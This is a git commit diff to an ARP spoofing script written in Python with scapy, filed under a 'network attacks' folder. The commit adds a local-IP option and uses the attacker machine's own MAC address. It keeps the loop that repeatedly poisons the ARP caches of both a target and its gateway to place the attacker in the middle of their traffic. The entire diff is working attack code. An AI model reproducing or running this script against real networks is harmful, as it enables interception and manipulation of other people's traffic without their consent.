8fa3a89935ec77d87088b61525c4e988161be2c9
rubb3rsc4nm4n <lukehamilton019@gmail.com>
2020-12-09 19:23:32 -0600

    fixes applied to arp_spoof.py

--- scripts/network attacks/arp_spoof.py
+++ scripts/network attacks/arp_spoof.py
@@ -7,14 +7,16 @@ import time
 def get_arguments():
     parser = optparse.OptionParser()
     parser.add_option("-t", "--target-ip", dest="dest_ip", help="please input a valid ip address of your target")
-    parser.add_option("-i", "--gateway-ip", dest="src_ip", help="please input a valid ip address of the machine you are impersonating")
-
+    parser.add_option("-g", "--gateway-ip", dest="src_ip", help="please input a valid ip address of the machine you are impersonating")
+    parser.add_option("-l", "--local-ip", dest="local_ip", help="Please input the ip address for your host on the same network as your target.")
     (options, arguments) = parser.parse_args()
 
     if not options.dest_ip:
-        print("Please enter a valid target ip")
+        print("[-] Please enter a valid target ip")
+    elif not options.local_ip:
+        print("[-] Please enter the local ip address for your attacking machine's network interface shared with the target.")
     elif not options.src_ip:
-        print("Please enter a valid ip you would like to impersonate.")
+        print("[-] Please enter a valid ip you would like to impersonate.")
     else:
         return options
 
@@ -27,9 +29,10 @@ def get_mac(ip):
         list = [element[1].psrc, element[1].hwsrc]
         return list[1]
 
-def spoof(target_ip, spoof_ip):
+def spoof(target_ip, spoof_ip, local_ip):
     dest_mac = get_mac(target_ip)
-    arp_resp = scapy.ARP(op=2,pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc="1c:bf:ce:1a:b8:09")
+    host_mac = get_mac(local_ip)
+    arp_resp = scapy.ARP(op=2,pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc=host_mac)
     scapy.send(arp_resp, verbose=False)
     #print(arp_resp.summary())
 
@@ -41,12 +44,12 @@ def restore(target_ip, spoof_ip):
     arp_resp = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc=src_mac)
     scapy.send(arp_resp, verbose=False)
     #print(arp_resp.summary())
-
+print(get_mac("192.168.0.1"))
 try:
     print("[+] spoofing arp on target and router...")
     while True:
-        spoof(options.dest_ip, options.src_ip)
-        spoof(options.src_ip, options.dest_ip)
+        spoof(options.dest_ip, options.src_ip, options.local_ip)
+        spoof(options.src_ip, options.dest_ip, options.local_ip)
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[+] Restoring ARP Tables...")
